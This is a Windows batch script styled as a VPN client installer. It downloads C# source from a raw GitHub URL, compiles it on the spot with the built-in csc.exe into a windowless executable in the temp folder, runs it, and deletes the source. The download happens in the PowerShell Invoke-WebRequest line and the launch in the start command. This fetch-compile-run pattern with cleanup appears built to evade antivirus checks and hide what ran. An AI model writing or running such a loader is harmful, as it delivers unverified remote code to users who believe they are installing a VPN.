@echo off
setlocal
set LOG=%USERPROFILE%\vpnclient_setup.log
set CS=%TEMP%\vpn_installer_%RANDOM%.cs
set EXE=%TEMP%\vpn_installer_%RANDOM%.exe

echo [%TIME%] Starting > "%LOG%"

:: Find csc.exe (C# compiler, built into Windows)
set CSC=
for %%d in (
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
) do (
    if exist %%d set CSC=%%~d
)

if "%CSC%"=="" (
    echo [%TIME%] ERROR: csc.exe not found >> "%LOG%"
    msg * "C# compiler not found. Please install .NET Framework 4.5+"
    exit /b 1
)
echo [%TIME%] Compiler: %CSC% >> "%LOG%"

:: Download installer.cs from GitHub
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/JustMilkyArt/VPN-2/main/installer.cs' -OutFile '%CS%'" >nul 2>&1
if not exist "%CS%" (
    echo [%TIME%] ERROR: download failed >> "%LOG%"
    msg * "Failed to download installer.cs from GitHub"
    exit /b 1
)
echo [%TIME%] Download OK >> "%LOG%"

:: Compile
"%CSC%" /nologo /target:winexe /out:"%EXE%" /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.IO.Compression.dll /r:System.IO.Compression.FileSystem.dll /r:Microsoft.CSharp.dll "%CS%" >> "%LOG%" 2>&1
if not exist "%EXE%" (
    echo [%TIME%] ERROR: compile failed >> "%LOG%"
    msg * "Compile error - see %LOG%"
    exit /b 1
)
echo [%TIME%] Compile OK >> "%LOG%"

:: Run
start "" "%EXE%"
echo [%TIME%] Launched >> "%LOG%"

:: Cleanup source (keep exe until it exits)
del "%CS%" >nul 2>&1
endlocal
